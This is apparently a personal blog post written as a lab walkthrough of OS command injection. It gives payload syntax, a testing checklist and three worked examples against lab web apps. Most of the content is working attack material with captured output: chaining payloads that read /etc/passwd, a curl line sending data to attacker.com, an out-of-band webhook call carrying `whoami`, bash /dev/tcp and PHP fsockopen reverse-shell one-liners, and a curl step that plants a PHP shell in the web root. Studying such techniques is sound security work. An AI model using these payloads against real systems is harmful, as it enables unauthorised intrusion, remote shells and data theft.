---
layout: post
title: Command Injection
subtitle: Application taking input from the user. Then passing the input to the function which executes as the code
date: 2025-07-31 09:43
author: Ren Sie
comments: true
category: injection
---

### Injection Type: 
1. Basic
2. Blind
3. Out of Band

{: .box-note}
**Note:** 🚨 eval() is Evil. <br> eval() is an executed function that process any data that pass to it.

### Exploitation Syntax

1. Basic command chaining  
   `; ls -la`
2. Using logic operators  
   `&& ls -la`
3. Commenting out the rest of a command  
   `; ls -la #`
4. Using a pipe for command chaining  
   `| ls -la`
5. Testing for blind injection  
   `; sleep 10  
   ; ping -c 10 127.0.0.1  
   & whoami > /var/www/html/whoami.txt &`
6. Out-of-band testing  
   `& nslookup webhook.site/<id>?`whoami` &`

### Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  
  1. **Determine the technology stack?**  
     * Which operating system and server software are in use?  
    
  2. **Verify injection points**  
      * URL parameters
      * Form fields (e.g., login forms or search boxes)  
      * HTTP headers (e.g., cookies, user-agent, authorization token, X-Forwarded-For, etc.)  
    
  3. **Test for simple injections with special characters** (`;`, `&&`, `||`, and `|`).
      * Test for injection within command arguments.  
    
  4. **Test for blind command injection**  
      * If output isn't directly visible, try creating outbound requests.  
      * ping: `;ping+-c+10+127.0.0.1`  
      * curl: `;curl+http://attacker.com/log`  
      * Webhook  
  
  5. **Try to escape from any restriction mechanisms**
      * Inject a `'` or `"` to prematurely terminate the quoted string.

  7. **Test with a list of potentially dangerous functions/methods**
      * PHP: `exec()`, `system()`, `passthru()`
      * Node.js: `exec`, `eval`

  8. **Test for command injection using time delays**
      * e.g., `ping -c 10 localhost`  

  10. **Test with common command injection payloads:**  
      * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)  

  11. **Try to bypass filter using various techniques**
      * encoding
      * command splitting (e.g., `;`, `&&`, `|`)
      * etc.  
</details>

## Example-1 Command Injection

### Escaping Function
Command syntax: curl -I -s -L `<User_Input>` | grep "HTTP/"
1. Try to enter legitimated input, we get:
   ~~~
   Input = https://google.com
   ~~~
   > User command: curl -I -s -L `https://google.com` | grep "HTTP/"  
   > Result: HTTP/2 301 HTTP/2 200  
   
2. Try use Basic command chaining, we get:
   ~~~
   Input = https://google.com; whoami
   ~~~
   > User command: curl -I -s -L `https://google.com; whoami` | grep "HTTP/"  
   > Result: HTTP/2 301 location: https://www.google[.]com/  
   > content-type: text/html; charset=UTF-8  
   > content-security-policy-report-only: object-src 'none';base-uri  
   > 'self';script-src 'nonce-JBk79PRoFMIpvf44w3EC-A' 'strict-  

3. To escape from the | grep "HTTP/”, use echo, we get:
   ~~~
   Input = ; whoami; echo 'null/'
   ~~~
   > User command: curl -I -s -L `; whoami; echo 'null/'` | grep "HTTP/"  
   > Result: www-data

### Inject other Commands
1. Run other command;
   ~~~
   Input = ; cat /etc/passwd; echo 'a'
   ~~~
   > Command: curl -I -s -L `; cat /etc/passwd ; echo 'a'` | grep "HTTP/"
   > daemon : x : 1 : 1: daemon: /usr/sbin: /usr/sbin/nologin  
   > bin:x: 2:2: bin: /bin:/usr/sbin/nologin  
   > sys : x : 3:3: sys :/dev: /usr/sbin/nologin  
   > Www-data:x :33:33:www-data:/var/www:/usr/sbin/nologin  
   > backup:x : 34: 34: backup: /var/backups: /usr/sbin/nologin  
   > irc:x:39:39: ircd: /run/ircd:/usr/sbin/nologin  
   > gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
   > nobody: x : 65534 : 65534 : nobody : /nonexistent :/usr/sbin/nologin  
   > lp:x:7:7: lp:/var/spool/lpd:/usr/sbin/nologin  
   > _apt : x : 100: 65534: : /nonexistent: /usr/sbin/nologin

### Reverse shell connection

#### Bash Shell

1. Learn the full path of bash it use;
   ~~~
   Input = ; which bash; echo 'a'
   ~~~
   > User command: curl -I -s -L `; which bash; echo 'a'` | grep "HTTP/"  
   > Result: /bin/bash

2. Use one line reverse bash_TCP shell
   ~~~
   Input = ; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1; echo 'a’
   ~~~

{: .box-note}
**Note:**💡When using command injection, try to use full path to binary. Plus common port.

#### PhP Shell

1. Learn the full path of php it use 
   ~~~
   Input = ; which php; echo 'a'
   ~~~
   > User command: curl -I -s -L `; which bash; echo 'a'` | grep "HTTP/"  
   > Result: /usr/local/bin/php  
2. Netcat listen on designated port
   > Listening on 0.0.0.0 4444 …
3. Use one line reverse PhP shell
   ~~~
   Input = `; /usr/local/bin/php -r '$sock=fsockopen("<LHOST>",<LPORT>); exec("/bin/sh -i <&3 >&3 2>&3");'; echo 'a’`
   ~~~
4. Receive the connection.
   > Connection received on 172.18.0.4 36776  
   > /bin/sh: 0: can't access tty; job control turned off  
   > $ whoami  
   > www-data  
   > $ tail /etc/passwd  
   > news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
   > uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
   > proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
   > www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
   > backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
   > list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
   > irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
   > gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin  
   > nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
   > _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    

## Example-2 Out of Bank Command Injection
In this case, the web application _doesn’t give us the response directly_, we need to direct and review it somewhere else.
1. Reuse the same syntax from previous example; we received Website OK, but the semi-colon is removed.
   ~~~
   google.com; ls
   ~~~
   > User command: Target: `google.com ls`  
   > Result: Website OK

2. Utilize the [webhook](https://webhook.site/) to receive the HTTP request. Insert our unique URL before the command:
   ~~~
   Input = https://webhook.site/8a2dda28-4ada-4424-889e-a911bd5e8489?`whoami`
   ~~~
2. Navigate to our unique url, we can find the command is executed and send to there.
   ![Executed Command](https://rencybersec.github.io/assets/img/githubpost/Commandi_1.png){: .mx-auto.d-block :}  
    
### Reverse Shell Connection
1. I tried to use `\n` and `wget` to download file from the server that host the reverse shell file. Then I realized even command was executed, it still can’t download the file
   ~~~
   Input = https://google.com \n wget <HOST_IP>:<PORT>/<File>
   ~~~
   > $ python3 -m http.server 8080  
   > Serving HTTP on 0.0.0.0 port 8080 (http[://]0.0.0.0:8080/) ...  
   > 172.18.0.3 - - [31/Jul/2025 07:42:38] code 404, message File not found  
   > 172.18.0.3 - - [31/Jul/2025 07:42:38] "HEAD /test HTTP/1.1" 404 -  
2. Then I tried to use php reverse shell to make the connection.  
   Same result as last step; command is executed, but shell isn’t established.
   ~~~
   Input = https://google.com \n wget <HOST_IP>:<PORT>/<File>
   ~~~
   > Serving HTTP on 0.0.0.0 port 8080 (http[://]0.0.0.0:8080/) ...  
   > 172.18.0.4 - - [27/Jul/2025 17:38:50] "HEAD /link.php HTTP/1.1" 200 -  
   > 172.18.0.4 - - [27/Jul/2025 17:39:57] "HEAD /link.php HTTP/1.1" 200 -  
3. Tried to use `&&` and `curl` this time to download the file.
   ~~~
   Input = https://google.com && curl <File_Hosting_Server_IP>:8080/link.php > /var/www/html/link.php  
   # Download the php reverse shell to the target server directory.
   ~~~
4. Search http[://]link.php from our browser, and we will trigger the web server to execute our php shell.
   > $ whoami  
   > www-data
    
## Challenge-1
Here’s the syntax of the Web application
Command syntax: awk 'BEGIN {print sqrt(((-`User_input_1`)^2) + ((-`User_input_2`)^2))}’
1. Close up the brackets in User_input_1, then injects the command, and comment out the rest.
   ~~~
   Input = )))}' ; whoami #
   ~~~
   > Result: www-data

2. Because the page is run off the php file, let out full path of its php
   ~~~
   Input = )))}' ; which php #
   ~~~
   > Result: /usr/local/bin/php

3. Use netcat listen on port 4444. Run the one line php shell for connection
   ~~~
   Input = )))}' ; /usr/local/bin/php -r '$sock=fsockopen("<Attacking_Machine>",4444); exec("/bin/sh -i <&3 >&3 2>&3");' #
   ~~~
   > Result:  
   > Listening on 0.0.0.0 4444  
   > Connection received on 172.18.0.4 56914  
   > /bin/sh: 0: can't access tty; job control turned off  
   > $ whoami  
   > www-data  
   > $ hostname  
   > 3d0a80465781  
